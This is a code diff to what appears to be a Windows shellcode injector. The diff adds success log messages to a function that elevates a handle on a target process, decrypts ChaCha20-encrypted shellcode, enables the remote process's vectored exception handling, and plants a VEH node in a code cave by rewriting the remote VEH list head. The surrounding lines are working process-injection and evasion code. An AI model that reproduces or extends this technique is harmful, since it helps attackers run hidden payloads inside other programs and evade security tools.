@@ -84,6 +84,9 @@ void InjectorEntry() {
 		PrintDbgW(L"[-] 目标进程句柄提权失败 | Failed to elevate target process handle\n");
 		ErrExit;
 	}
+	else {
+		PrintDbgW(L"[+] 目标进程句柄提权成功 | Successfully elevated target process handle\n");
+	}
 
 	unsigned char* shellcode = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(encrypted_shellcode));
 	chacha20_decrypt(encrypted_shellcode, sizeof(encrypted_shellcode), key, nonce, shellcode);
@@ -111,6 +114,9 @@ void InjectorEntry() {
 	if (!EnableRemoteVEH(hProcess)) {
 		PrintDbgW(L"[-] 启用远程进程VEH失败 | Failed to enable remote process VEH\n");
 		ErrExit;
+	}
+	else {
+		PrintDbgW(L"[+] 启用远程进程VEH成功 | Successfully enabled remote process VEH\n");
 	}
 
 	// 写入Shellcode
@@ -176,6 +182,8 @@ void InjectorEntry() {
 		if (bytesWritten == 0) {
 			PrintDbgW(L"[-] 写入引用标记失败 | Failed to write reference marker\n");
 			ErrExit;
+		} else {
+			PrintDbgW(L"[+] 写入引用标记成功 | Successfully wrote reference marker\n");
 		}
 
 		// 更新本地结点的 reserved 指向 refAddress
@@ -187,6 +195,8 @@ void InjectorEntry() {
 		if (bytesWritten == 0) {
 			PrintDbgW(L"[-] 写入VEH结点失败 | Failed to write VEH node\n");
 			ErrExit;
+		} else {
+			PrintDbgW(L"[+] 写入VEH结点成功 | Successfully wrote VEH node\n");
 		}
 
 		// 更改复制的VEH链表头为指向零洞中的结点（保持结点的 Flink/Blink 指向 ListHead）
@@ -203,6 +213,8 @@ void InjectorEntry() {
 		if (bytesWritten == 0) {
 			PrintDbgW(L"[-] 写入远程VEH链表头失败 | Failed to write remote VEH list head\n");
 			ErrExit;
+		} else {
+			PrintDbgW(L"[+] 写入远程VEH链表头成功 | Successfully wrote remote VEH list head\n");
 		}
 		SFNtProtectVirtualMemory(hProcess, &protBase, &protSize, oldProtPage ? oldProtPage : PAGE_READONLY, &tmpOld);
 	}
